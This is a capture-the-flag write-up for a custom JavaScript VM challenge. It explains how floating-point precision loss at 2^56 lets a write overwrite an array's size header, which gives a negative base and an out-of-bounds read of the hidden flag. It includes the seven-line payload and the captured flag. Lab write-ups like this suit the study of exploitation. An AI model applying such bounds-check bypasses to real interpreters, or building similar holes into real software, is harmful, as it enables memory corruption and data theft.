---
The bug is pure JavaScript weirdness + IEEE‑754 rounding. used cheat gpt-5 pro
```
The VM stores the flag at backing[-1].

You can’t supply negative indices, but the VM’s address calc is:

backing_index = arrays[ref] (base) + idx + 1


JavaScript numbers are IEEE‑754 doubles. For very large bases, base + 1 === base (precision loss).
Pick the first array size S = 2^56 = 72057594037927936 (exact).
Creating a second array places its base at B ≈ S + 1, which rounds to B = S.

With B = 2^56, the ULP (spacing) is 16. So any access to B + (small) + 1 rounds back to B.
That lets us overwrite the size header (which lives at backing[B]) by “writing” to index 0 of array #1.

We set that size to -(B + 16) using one subtraction. Then a subsequent NEW computes:

new_base = B + (-(B + 16)) + 1 = -15


So array #2 has base = -15 and its size field is written to backing[-15] (allowed in JS).

Now PRINT 2.13 computes -15 + 13 + 1 = -1 and reads backing[-1], i.e. the flag Buffer.
Concatenation to the output coerces the Buffer to UTF‑8 → the flag string.

Minimal reasoning per line

NEW 72057594037927936 → arr0 base 0, size 2^56.

NEW 1 → arr1 base B ≈ 2^56 (rounds to 2^56), size 1.

INIT 0.0 0 → arr0[0] = 0.

INIT 0.1 72057594037927952 → arr0[1] = B+16 (exact multiple of 16).

SUB 0.0 0.1 1.0 → arr1[0] (rounds to header at backing[B]) = 0 - (B+16) = -(B+16).

NEW 100 → new array gets base -15, size 100 (written to backing[-15]).

PRINT 2.13 → address -15 + 13 + 1 = -1 → prints backing[-1] (the flag).
```
payload:
```
NEW 72057594037927936
NEW 1
INIT 0.0 0
INIT 0.1 72057594037927952
SUB 0.0 0.1 1.0
NEW 100
PRINT 2.13
```
```
flag: brunner{I_was_certain_using_arrays_was_a_good_idea}
```

Solved by: vicevirus